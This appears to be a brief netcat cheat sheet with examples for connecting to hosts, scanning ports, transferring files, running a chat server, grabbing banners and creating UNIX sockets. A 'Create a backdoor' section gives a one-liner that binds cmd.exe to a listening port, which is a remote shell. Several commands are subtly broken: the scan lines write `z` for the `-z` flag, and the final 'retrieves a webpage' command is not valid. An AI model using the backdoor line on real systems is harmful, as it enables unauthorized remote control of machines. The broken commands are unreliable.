The netcat utility allows testing of a host's ports, similar to **ping**, but more versatile because **ping** only uses the portless ICMP protocol. 
GNU and OpenBSD versions available

| Option | Effect         |
| :----- | :------------- |
| `-l`   | listening mode |

Connect to host on port 80
```
nc example.com 80
```
Scan ports
```
# Scan a single port
nc -v -w 2 z 192.168.56.1 22

# Scan multiple ports
nc -v -w 2 z 192.168.56.1 22 80

# Scan a range of ports
nc -v -w 2 z 192.168.56.1 22-25
```
Transfer files between servers
This example uses the `pv` utility to monitor progress.
```
# Run `nc` in listening mode (`-l` option) on port 3000
tar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5

# On the receiving client, to obtain the file:
nc 192.168.1.4 3000 | pv | tar -zxf -
```
Create a command-line chat server
```
# Create chat server listening on port 5000
nc -l -vv -p 5000

# Launch a chat session on the other system
nc 192.168.56.1 5000
```
Find a service running on port
Obtain port banners (`-n` disables DNS lookup)
```
nc -v -n 192.168.56.110 80
```
Create stream sockets
Create and listen on a UNIX-domain stream socket
```
nc -lU /var/tmp/mysocket &
ss -lpn | grep "/var/tmp/"
```
Create a backdoor
Netcat needs to listen on a chosen port (here 3001): `-d` disables reading from stdin; `-e` specifies the command to run on the target system
```
nc -L -p 3001 -d -e cmd.exe
```
Connect to {port} at {host}
```sh
nc host port
```
Netcat command that retrieves a webpage
```sh
nc host port get
```
